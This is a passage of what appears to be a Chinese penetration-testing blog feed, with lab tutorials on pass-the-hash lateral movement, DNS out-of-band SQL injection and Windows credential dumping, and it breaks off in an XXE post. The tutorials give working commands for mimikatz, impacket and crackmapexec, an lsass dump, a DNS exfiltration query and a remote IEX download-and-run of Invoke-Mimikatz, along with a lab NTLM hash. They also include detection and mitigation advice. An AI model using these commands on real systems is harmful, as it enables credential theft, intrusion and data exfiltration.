aad3b4xxxxxxxxxxxxx1404ee:8acfxxxxxxxxxxxxxxxeb3209</span><br></pre></td></tr></table></figure><p>若报错需关闭目标机器的UAC。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204112813.png"></p><p><strong>psexec_command</strong></p><p>隐蔽性更好，执行完就退出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use admin/smb/psexec_command </span><br><span class="line">set rhosts 172.16.1.6 </span><br><span class="line">set smbdomain holy </span><br><span class="line">set smbuser testuser </span><br><span class="line">set smbpass aad3b4xxxxxxxxxxxxxxxxxxxx04ee:8acfaxxxxxxxxxxxxxxxxxxxxxxeb3209 </span><br><span class="line">set command whoami</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204113019.png"></p><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><strong>mimikatz</strong></h2><p>非域环境利用，&#x2F;domain后写IP。如果禁用了ntlm认证，则无法利用ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::pth /domain:holy.testA /user:testuser /ntlm:8acfxxxxxxxxxxxxxxxxxxxx3209</span><br></pre></td></tr></table></figure><p>ps：dir查看文件目录时需使用主机名，使用ip可能会报错。<br><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204140849.png"></p><h2 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h2><p>用于网络协议的Python类的集合。多系统支持。</p><p><strong>smbclient</strong></p><p>返回smbshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient.exe -hashes aad3bxxxxxxxxxxxxxxxxxxx1404ee:8acfa0xxxxxxxxxxxxxxxxxxxxxb3209 testuser\@172.16.1.6</span><br></pre></td></tr></table></figure><p><strong>smbexec</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbexec.py -hashes :8acfa0xxxxxxxxxxxxxxxxxxx3209 testuser\@172.16.1.6</span><br></pre></td></tr></table></figure><p><strong>wmiexec</strong></p><p>wmiexec是对windows自带的wmic做了一些强化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes :8acfaxxxxxxxxxxxxxxxxxeb3209 testuser\@172.16.1.6</span><br></pre></td></tr></table></figure><p><strong>psexec</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes aad3b4xxxxxxxxxxxxxxxxxxxxxxxx404ee:8acfxxxxxxxxxxxxxxxxxxxxxxxb3209 testuser\@172.16.1.6</span><br></pre></td></tr></table></figure><p><strong>rpcdump</strong></p><p>通过rpc获取端点信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcdump.exe -hashes aad3b4xxxxxxxxxxxxxxxxxxxxxxxx404ee:8acfxxxxxxxxxxxxxxxxxxxxxxxb3209 testuser\@172.16.1.6</span><br></pre></td></tr></table></figure><p><strong>atexec</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe -hashes aad3b4xxxxxxxxxxxxxxxxxxxxxxxx404ee:8acfxxxxxxxxxxxxxxxxxxxxxxxb3209 testuser\@172.16.1.6 whoami</span><br></pre></td></tr></table></figure><p><strong>lookupsid</strong></p><p>可以遍历本地用户和域用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookupsid.exe -hashes aad3b4xxxxxxxxxxxxxxxxxxxxxxxx404ee:8acfxxxxxxxxxxxxxxxxxxxxxxxb3209 testuser\@172.16.1.6</span><br></pre></td></tr></table></figure><p><strong>samrdump、reg等。</strong></p><h2 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a><strong>crackmapexec</strong></h2><p>多系统支持，可执行命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb target 172.16.1.6 -u testuser -H 8acfxxxxxxxxxxxxxxxxxxxx9eb3209 -x ipconfig</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218142120.png"></p><p>扫描C段批量pth。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb target 172.16.1.0/24 -u testuser -H 8axxxxxxxxxxxxxxxxxxxxxxb3209</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204131125.png"></p><h2 id="wce"><a href="#wce" class="headerlink" title="wce"></a><strong>wce</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce -s testuser:holy.testA:aad3xxxxxxxxxxxxxxxxxxx4ee:8axxxxxxxxxxxxxxxxxxxxxxxxxxxx3209</span><br></pre></td></tr></table></figure><h2 id="pth-kali内置工具包"><a href="#pth-kali内置工具包" class="headerlink" title="pth kali内置工具包"></a>pth kali内置工具包</h2><p><strong>winexe</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U testuser%aad3b435b51404eeaad3b435b51404ee:8acfa082097b69e5211699cc29eb3209 //172.16.1.6 cmd.exe</span><br></pre></td></tr></table></figure><p><strong>wmic</strong></p><p>走的WMI接口，需要使用WMI命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-wmic -U testuser%aad3b435b51404eeaad3b435b51404ee:8acfa082097b69e5211699cc29eb3209 //172.16.1.6 \&quot;select Name from Win32_UserAccount\&quot;</span><br></pre></td></tr></table></figure><p><strong>rpcclient</strong></p><p>可执行RPC命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pth-rpcclient -U testuser%aad3b435b51404eeaad3b435b51404ee:8acfa082097b69e5211699cc29eb3209 //172.16.1.6 </span><br><span class="line">srvinfo</span><br></pre></td></tr></table></figure><p><strong>pth-curl、pth-smbget、pth-net、pth-smbclient、pth-sqsh等。</strong></p><h2 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a><strong>Empire</strong></h2><p><strong>Invoke_smbexec</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_smbexec </span><br><span class="line">set ComputerName DC.holy.testA </span><br><span class="line">setm Username testuser </span><br><span class="line">set Hash aad3b4xxxxxxxxxxxxxxxxxxxxxxxxxx1404ee:8acfxxxxxxxxxxxxxxxxxxxxxxxxxxxb3209 </span><br><span class="line">set Listener fxx </span><br><span class="line">set Domain holy.testA </span><br><span class="line">execute</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204132722.png"></p><h2 id="Powershell-Invoke-TheHash工具包"><a href="#Powershell-Invoke-TheHash工具包" class="headerlink" title="Powershell Invoke-TheHash工具包"></a><strong>Powershell Invoke-TheHash工具包</strong></h2><p>创建文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-TheHash.psd1;Invoke-WMIExec -Target 172.16.1.6 -Domain holy.testA -Username testuser -Hash 8acfxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxeb3209 -Command &quot;cmd /c mkdir c:\666&quot; -verbose</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204132943.png"></p><p>若无smb共享权限，可以使用Invoke-SMBClient，可上传、下载、删除文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-SMBExec.ps1;Invoke-SMBExec -Target 172.16.1.6 -Domain holy.testA -Username testuser -Hash 8axxxxxxxxxxxxxxxxxxxxxxxxxxxx3209 -Command &quot;calc.exe&quot; -verbose</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204140006.png"></p><h1 id="pth攻击检测"><a href="#pth攻击检测" class="headerlink" title="pth攻击检测"></a><strong>pth攻击检测</strong></h1><ul><li>监控日志，发现pth攻击工具后告警。</li><li>监控主机上的异常行为，如试图篡改lsass进程等。</li><li>监控配置文件中的异常更改，因为pth攻击可能会修改这些配置（LocalAccountTokenFilterPolicy, WDigest等）。</li><li>监控单个IP地址的多个成功或失败的连接。</li></ul><h1 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h1><ul><li>禁用LocalAccountTokeFilterPolicy设置。</li><li>使用LAPS本地密码管理方案。</li><li>使用强身份认证策略。</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://www.cnblogs.com/feizianquan/p/11764344.html">https://www.cnblogs.com/feizianquan/p/11764344.html</a><br><a href="https://www.freebuf.com/articles/network/217681.html">https://www.freebuf.com/articles/network/217681.html</a><br><a href="http://www.myzaker.com/article/5ecb27b58e9f092ed60a3d50/">http://www.myzaker.com/article/5ecb27b58e9f092ed60a3d50/</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 票据 </tag>
            
            <tag> Kerberos </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS注入简单利用</title>
      <link href="/2021/02/03/5a13bff.html"/>
      <url>/2021/02/03/5a13bff.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h1><p>当使用load_file()函数访问域名时会产生DNS解析，因此可以构造sql查询语句利用DNS解析查询数据库。</p><h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a><strong>利用场景</strong></h1><ul><li><p>不同数据库中允许发起DNS请求的数据库函数需开启，如load_file()。</p></li><li><p>目标系统若无法连接外网，必须可向外发送DNS请求。</p></li><li><p>存在注入点，无回显，只能进行盲注，攻击时间过长。</p></li></ul><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a><strong>复现</strong></h1><p>正常读取域名UNC路径。</p><p>格式：\\servername\sharename，win下存在，linux下不存在，需要用反斜杠做转义。ps：DNS请求中不允许存在特殊字符，需要用hex()把查询结果编码再发送。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;\\\\fdsafdsfdssx.xxxx.com\\1.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203132552.png"></p><p>查询数据库版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select version()),&#x27;.xxx.xxx/abc&#x27;));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203133252.png"></p><p>拼接的字段只能有一条，所以需要进行限制，不然会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203133742.png"></p><p>在sqlmap中利用的话需要使用–dns-domain，速度很快，推荐联合或者盲注时用。</p><p>环境：</p><ul><li><p>vps：sqlmap（sqlmap需要运行在DNS解析的服务器上）、域名、自定义DNS</p></li><li><p>windows：sqli</p></li></ul><p>配置域名和自定义DNS过程略过，网上一抓一把。</p><p>在本机ping域名，查看是否收到DNS请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump –n port 53</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203153116.png"></p><p>查看数据库配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%skip%&#x27;;</span><br></pre></td></tr></table></figure><p>如图，默认配置是数据库可以进行域名解析。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203134139.png"></p><p>把本机80端口转发到VPS上，懒得搭环境了。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203134314.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1:3333/sqli-labs/Less-1/?id=1&quot; --tech=T --dns-domain=v3teran.xyz --dbms=mysql --current-db --batch</span><br></pre></td></tr></table></figure><p>很快，就两秒。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203134511.png"></p><p>结果会携带到DNSLOG中，16进制解码一下。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203134805.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203134829.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://www.cnblogs.com/depycode/p/5954904.html">https://www.cnblogs.com/depycode/p/5954904.html</a><br><a href="https://mp.weixin.qq.com/s/YrtOdjIvJ0JV4twonp5FrQ">https://mp.weixin.qq.com/s/YrtOdjIvJ0JV4twonp5FrQ</a><br><a href="https://www.freebuf.com/sectool/222967.html">https://www.freebuf.com/sectool/222967.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
            <tag> OOB </tag>
            
            <tag> 注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows本地Hash获取</title>
      <link href="/2021/02/02/b0919bb1.html"/>
      <url>/2021/02/02/b0919bb1.html</url>
      
        <content type="html"><![CDATA[<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a><strong>TIPS</strong></h1><ul><li><p>前提是获得系统高权限。</p></li><li><p>本地用户名、散列值等都存放在c:\windows\system32\config\sam中，lsass.exe进程用于本地安全策略和登录策略，只要用户通过RDP登录过，就会将hash保存到lsass中。使用工具可将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。（目标机&gt;&#x3D;server 2012时，无法在lsass.exe进程中抓取明文密码）</p></li><li><p>可以抓到包括当前登录以及远程RDP登录的账号，远程RDP注销后也还能抓到，重启一下就不行了。</p></li></ul><h1 id="工具列举"><a href="#工具列举" class="headerlink" title="工具列举"></a>工具列举</h1><h2 id="GetPass"><a href="#GetPass" class="headerlink" title="GetPass"></a><strong>GetPass</strong></h2><p>抓明文。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203163106.png"></p><h2 id="PwDump7"><a href="#PwDump7" class="headerlink" title="PwDump7"></a><strong>PwDump7</strong></h2><p>抓NTLM-hash。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203163159.png"></p><h2 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a><strong>QuarksPwDump</strong></h2><p>容易被杀。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe --dump-hash-local</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203163659.png"></p><h2 id="SAMInside"><a href="#SAMInside" class="headerlink" title="SAMInside"></a><strong>SAMInside</strong></h2><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203163832.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203163931.png"></p><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><strong>mimikatz</strong></h2><p>读取本地文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug      提升权限 </span><br><span class="line">token::elevate        提升到system权限</span><br><span class="line">lsadump::sam          读取本地sam文件</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203164315.png"></p><p>或者读取明文密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a><strong>MSF</strong></h2><p>hashdump，前提是需要在system权限下运行，可以getsystem，也可以migrate迁移到system进程。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203164542.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203164619.png"></p><p>运行hashdump。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203164718.png"></p><p>加载脚本也可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><p>还可以通过加载mimikatz。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz </span><br><span class="line">mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203164828.png"></p><h2 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a><strong>WCE</strong></h2><p>支持Windows XP，Windows 2003，Vista，Windows 7和Windows 2008，需管理员权限。</p><p>直接抓明文。-o输出到文件再读取也行。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203164941.png"></p><h2 id="导出SAM文件"><a href="#导出SAM文件" class="headerlink" title="导出SAM文件"></a><strong>导出SAM文件</strong></h2><p>本地执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive reg save hklm\system system.hive</span><br></pre></td></tr></table></figure><p>mimikatz读取导出文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203170013.png"></p><h2 id="Cain"><a href="#Cain" class="headerlink" title="Cain"></a><strong>Cain</strong></h2><p>cain读取导出文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203174007.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203170219.png"></p><h2 id="离线读取lsass-dmp文件"><a href="#离线读取lsass-dmp文件" class="headerlink" title="离线读取lsass.dmp文件"></a><strong>离线读取lsass.dmp文件</strong></h2><p>mimikatz等工具在目标机器上无法使用。</p><p>直接导出。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203170944.png"></p><p>或者用procdump导出，微软官方工具不会被杀。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>然后用mimikatz导出lsass.dmp文件中的散列值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp 把文件加载进去 </span><br><span class="line">sekurlsa::logonpasswords full 导出</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203172146.png"></p><h2 id="Powershell读取hash"><a href="#Powershell读取hash" class="headerlink" title="Powershell读取hash"></a><strong>Powershell读取hash</strong></h2><p>Nishang的Get-PassHashes.ps1脚本，可本地执行或远程加载，需要管理员权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-PassHashes.ps1 </span><br><span class="line">Get-PassHashes</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210203173559.png"></p><p>或者远程加载mimikatz。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX (New-Object Net.WebClient).DownloadString(\&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\&#x27;); Invoke-Mimikatz</span><br></pre></td></tr></table></figure><h2 id="Gethashes"><a href="#Gethashes" class="headerlink" title="Gethashes"></a><strong>Gethashes</strong></h2><p>必须以system权限运行。</p><h1 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h1><h2 id="防止抓取明文密码"><a href="#防止抓取明文密码" class="headerlink" title="防止抓取明文密码"></a><strong>防止抓取明文密码</strong></h2><ul><li><p>安装KB2871997补丁。</p></li><li><p>关闭wdigest协议，这个协议允许windows将明文密码存储在内存中。</p><p>server 2012及以上默认关闭，该注册表值为1时重启后可获取明文密码，为0则相反。</p><p>关闭操作，若开启则将0修改成1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DEWORD /d 0 /f</span><br></pre></td></tr></table></figure><p>查询是否修改成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential</span><br></pre></td></tr></table></figure><p>powershell操作方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentCzontrolSet\\Control\\SecurityProviders\\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure></li></ul><h2 id="防止抓取明文密码及hash"><a href="#防止抓取明文密码及hash" class="headerlink" title="防止抓取明文密码及hash"></a><strong>防止抓取明文密码及hash</strong></h2><ul><li><p>server 2012 R2新增”受保护的用户”用户组，该组成员无法被抓取明文密码及hash。（mimikatz读取结果明文password为null）</p></li><li><p>防御mimikatz</p><p>可以不赋予administrator debug权限，重启机器，之后运行mimikatz输入privilege::debug会报错。在抓取密码及hash时mimikatz需要使用debug权限和lsass.exe进程交互。默认administrator有该权限。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hash </tag>
            
            <tag> LSASS </tag>
            
            <tag> SAM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2021/02/01/e93ac459.html"/>
      <url>/2021/02/01/e93ac459.html</url>
      
        <content type="html"><![CDATA[<p>简单记录一下XXE的学习过程。</p><h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a><strong>XML</strong></h1><p>用来传输和存储数据的一种可扩展标记语言。XML和HTML的区别：前者为了传输和存储数据，两个不同的系统可以通过XML进行通信和交换数据，不同的编程语言对XML的解析程度不同；后者是用来显示数据的，更注重外观。</p><p>整个XML大致分为：文档的声明、元素的定义和元素的内容。</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a><strong>DTD</strong></h2><p>文档类型定义，一种XML约束模式语言，由元素类型声明、属性声明、实体声明、记号声明等构成。</p><p>每个XML文件可以携带一个自身格式的描述，可以进行内部声明和外部引用，不同组织的人可以使用一个通用DTD来交换数据。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201140831.png"></p><h2 id="DTD文档引用方式"><a href="#DTD文档引用方式" class="headerlink" title="DTD文档引用方式"></a>DTD文档引用方式</h2><ol><li><p>引用内部DTD文档。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span><br></pre></td></tr></table></figure></li><li><p>引用外部DTD文档。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201142414.png"></p></li><li><p>引用内外部DTD文档。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文档路径&quot; [定义内容]&gt;</span><br></pre></td></tr></table></figure></li><li><p>引用公共DTD。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201142448.png"></p></li></ol><h2 id="ENTITY"><a href="#ENTITY" class="headerlink" title="ENTITY"></a><strong>ENTITY</strong></h2><p>用于定义引用普通文本或特殊字符的快捷方式的变量。在文档内可能多处都要用到一样的内容，可以考虑将该这部分内容声明为一个实体，在需要的地方用实体引用来替代。</p><p>实体类型：普通实体、参数实体</p><table><thead><tr><th align="center">类型</th><th align="center">普通实体</th><th align="center">参数实体</th></tr></thead><tbody><tr><td align="center">使用场合</td><td align="center">在DTD中声明，在XML中引用</td><td align="center">在DTD声明和引用</td></tr><tr><td align="center">内部</td><td align="center">&lt;!ENTITY 实体名 “文本内容”&gt;</td><td align="center">&lt;!ENTITY % 实体名 “文本内容”&gt;</td></tr><tr><td align="center">外部</td><td align="center">&lt;!ENTITY 实体名 SYSTEM “外部文件URL地址”&gt;</td><td align="center">&lt;!ENTITY % 实体名 SYSTEM “外部文件URL地址”&gt;</td></tr><tr><td align="center">引用</td><td align="center">&amp;实体名;</td><td align="center">%实体名;</td></tr></tbody></table><p>外部引用可支持很多协议，不同的语言支持的协议不同，有一些协议通用。</p><table><thead><tr><th>libxml2</th><th>php</th><th>java</th><th>.net</th></tr></thead><tbody><tr><td>file<br />http<br />ftp</td><td>file<br />ftp<br />http<br />phar<br />php<br />glob<br />data<br />compress.zlib<br />compress.bzip2</td><td>http<br />https<br />gopher<br />file<br />ftp<br />jar<br />netdoc<br />mailto</td><td>file<br />ftp<br />http<br />https<br /></td></tr></tbody></table><p>普通实体引入外部实体。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201145949.png"></p><p>参数实体引入外部实体。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201150058.png"></p><p>参数实体的特性：只能在DTD内部、立即引用、实体嵌套。</p><p>立即引用即参数实体在DTD中声明后，需要在DTD中完成引用，如上图。</p><p>实体嵌套即在实际使用中通常需要再嵌套一个参数实体。%号是需要处理成&amp;#37或&amp;#x25。若直接利用%，在引用时会报错，找不到该参数实体名称。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201151312.png"></p><p>在内部DTD中，参数实体不能写在标记声明内部。若在参数实体的声明中使用另一个参数实体的话，需要利用外部DTD文件引入的方式。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201151704.png"></p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a><strong>XXE</strong></h1><p>XML外部实体注入。</p><p>服务端没有合理处理客户提交的XML文件引用的外部实体，且该实体支持file、ftp等协议的URL，可以通过声明URL指向服务器本地或者内网的实体造成攻击。</p><h1 id="XXE危害"><a href="#XXE危害" class="headerlink" 